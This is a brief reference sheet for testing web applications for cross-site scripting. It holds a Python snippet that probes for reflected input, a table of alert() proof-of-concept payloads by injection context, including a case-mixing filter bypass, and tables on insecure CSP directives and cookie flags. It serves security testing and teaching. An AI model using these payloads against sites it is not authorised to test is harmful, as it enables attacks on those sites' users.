# API Reference: Testing for XSS Vulnerabilities

## requests Library for XSS Testing

### Reflection Testing
```python
from urllib.parse import quote
# Inject canary to find reflection points
resp = requests.get(f"{url}?q={canary}")
if canary in resp.text:
    # Input is reflected - test payloads
    resp = requests.get(f"{url}?q={quote(payload)}")
```

## XSS Payload Categories
| Context | Example Payload |
|---------|----------------|
| HTML body | `<script>alert(document.domain)</script>` |
| HTML attribute | `" onfocus=alert(1) autofocus="` |
| JavaScript string | `';alert(1)//` |
| URL/href | `javascript:alert(1)` |
| Event handler | `<img src=x onerror=alert(1)>` |
| SVG | `<svg onload=alert(1)>` |
| Filter bypass | `<ScRiPt>alert(1)</sCrIpT>` |

## XSS Types
| Type | Description | Persistence |
|------|-------------|-------------|
| Reflected | Payload in URL/request, reflected in response | Non-persistent |
| Stored | Payload saved server-side, rendered to others | Persistent |
| DOM-based | Payload processed by client-side JavaScript | Client-side |

## CSP Analysis
| Directive | Insecure Value | Risk |
|-----------|---------------|------|
| `script-src` | `'unsafe-inline'` | Allows inline `<script>` tags |
| `script-src` | `'unsafe-eval'` | Allows `eval()` and similar |
| `script-src` | `*.googleapis.com` | May host JSONP endpoints |
| `base-uri` | Not set | Allows `<base>` tag injection |
| `default-src` | `*` | Allows scripts from any origin |

## Cookie Security Flags
| Flag | Purpose |
|------|---------|
| `HttpOnly` | Prevents JavaScript access to cookies |
| `Secure` | Only send over HTTPS |
| `SameSite` | Cross-site request protection |

## References
- OWASP XSS Guide: https://owasp.org/www-community/attacks/xss/
- XSS Filter Evasion: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- CSP Evaluator: https://csp-evaluator.withgoogle.com/
- PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting
